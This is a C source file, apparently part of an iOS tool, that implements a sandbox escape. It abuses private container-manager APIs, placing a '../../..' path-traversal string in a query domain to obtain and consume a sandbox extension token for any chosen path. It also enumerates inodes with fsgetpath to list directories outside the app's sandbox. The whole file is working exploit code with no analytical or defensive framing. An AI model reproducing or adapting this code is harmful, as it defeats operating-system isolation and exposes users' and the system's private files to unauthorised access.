#include "NigaSandbox.h"
#include <dlfcn.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fsgetpath.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <xpc/xpc.h>

typedef void *(*query_create_fn)(void);
typedef void (*query_set_class_fn)(void *, uint64_t);
typedef void (*query_set_ids_fn)(void *, xpc_object_t);
typedef void (*query_set_flags_fn)(void *, uint64_t);
typedef void (*query_set_part_fn)(void *, uint64_t);
typedef void (*query_set_domain_fn)(void *, const char *);
typedef void *(*query_single_fn)(void *);
typedef void (*query_free_fn)(void *);
typedef char *(*copy_token_fn)(void *);
typedef int64_t (*consume_fn)(const char *);
typedef int (*release_fn)(int64_t);

int64_t niga_escape_path(const char *path, bool create) {
    if (!path || path[0] != '/') return -255;
    if (!create) { struct stat st; if (lstat(path, &st) != 0) return -254; }

    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -1;

    query_create_fn qcreate = (query_create_fn)dlsym(mgr, "container_query_create");
    query_set_class_fn qclass = (query_set_class_fn)dlsym(mgr, "container_query_set_class");
    query_set_ids_fn qids = (query_set_ids_fn)dlsym(mgr, "container_query_set_group_identifiers");
    query_set_flags_fn qflags = (query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    query_set_part_fn qpart = (query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    query_set_domain_fn qdomain = (query_set_domain_fn)dlsym(mgr, "container_query_operation_set_part_domain");
    query_single_fn qsingle = (query_single_fn)dlsym(mgr, "container_query_get_single_result");
    query_free_fn qfree = (query_free_fn)dlsym(mgr, "container_query_free");
    copy_token_fn copytoken = (copy_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    consume_fn consume = (consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    if (!qcreate || !qclass || !qids || !qflags || !qpart || !qdomain || !qsingle || !qfree || !copytoken || !consume) { dlclose(mgr); return -1; }

    void *query = qcreate();
    if (!query) { dlclose(mgr); return -2; }
    xpc_object_t identifier = xpc_string_create("systemgroup.com.apple.mobilegestaltcache");
    qclass(query, 13);
    qids(query, identifier);
    qpart(query, 3);

    char *domain = NULL;
    if (asprintf(&domain, "../../../../../../../..%s", path) == -1) {
        xpc_release(identifier); qfree(query); dlclose(mgr); return -5;
    }
    qdomain(query, domain);
    qflags(query, 0x0000008000000000ULL);
    void *result = qsingle(query);
    if (!result) { free(domain); xpc_release(identifier); qfree(query); dlclose(mgr); return -3; }
    char *token = copytoken(result);
    if (!token) { free(domain); xpc_release(identifier); qfree(query); dlclose(mgr); return -4; }
    int64_t handle = consume(token);
    free(token); free(domain); xpc_release(identifier); qfree(query); dlclose(mgr);
    return handle;
}

void niga_release_path(int64_t handle) {
    if (handle < 0) return;
    release_fn release = (release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release) release(handle);
}

char *niga_list_children(const char *path, int64_t max_inode) {
    if (!path || max_inode <= 0) return NULL;
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;
    size_t cap = 65536, length = 0, plen = strlen(path);
    char *out = malloc(cap); if (!out) return NULL; out[0] = '\0';
    char buf[1200];
    for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino); if (n <= 0) continue;
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, plen) != 0 || p[plen] != '/') continue;
        if (strchr(p + plen + 1, '/')) continue;
        size_t need = strlen(p) + 2;
        if (length + need > cap) { cap *= 2; char *tmp = realloc(out, cap); if (!tmp) break; out = tmp; }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    return out;
}

void niga_free_string(char *value) { if (value) free(value); }
